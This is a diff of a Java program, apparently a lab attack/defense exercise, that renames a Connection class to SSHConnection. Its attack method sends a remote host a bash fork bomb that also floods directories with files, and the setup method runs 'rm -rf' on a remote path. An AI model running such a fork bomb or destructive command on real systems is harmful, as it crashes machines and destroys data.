@@ -1,6 +1,6 @@
 package vitor.dev;
 
-import vitor.dev.connection.Connection;
+import vitor.dev.connection.SSHConnection;
 
 public class Main {
 
@@ -19,7 +19,7 @@ public class Main {
         // Connection.transfer(LIB + "attack.sh", REMOTE_PATH);
         // Connection.command("chmod +x " + REMOTE_PATH + "/attack.sh");
         // Connection.sudoCommand("bash " + REMOTE_PATH + "/attack.sh", SUDO_PASSWD);
-        Connection.command(
+        SSHConnection.command(
                 "bash -c ':() { for D in $(find \"/home/ubuntu/Vitor\" -type d); do touch \"$D/vitor_$(date +%s%N).txt\"; done; :|: & };:'");
     }
 
@@ -28,18 +28,18 @@ public class Main {
      */
     public static void defense() {
         // Corrigindo caminho para usar LIB (no Windows)
-        Connection.transfer(LIB + "defense.sh", REMOTE_PATH);
-        Connection.command("chmod +x " + REMOTE_PATH + "/defense.sh");
-        Connection.sudoCommand("bash " + REMOTE_PATH + "/defense.sh", SUDO_PASSWD);
+        SSHConnection.transfer(LIB + "defense.sh", REMOTE_PATH);
+        SSHConnection.command("chmod +x " + REMOTE_PATH + "/defense.sh");
+        SSHConnection.sudoCommand("bash " + REMOTE_PATH + "/defense.sh", SUDO_PASSWD);
     }
 
     /**
      * Coneta e configura o ambiente no servidor remoto.
      */
     public static void setup() {
-        Connection.connect(USER, HOST, PASSWD, PORT); // Se conectando ao host.
-        Connection.command("rm -rf " + REMOTE_PATH);
-        Connection.command("mkdir " + REMOTE_PATH);
+        SSHConnection.connect(USER, HOST, PASSWD, PORT); // Se conectando ao host.
+        SSHConnection.command("rm -rf " + REMOTE_PATH);
+        SSHConnection.command("mkdir " + REMOTE_PATH);
     }
 
     public static void main(String[] args) {
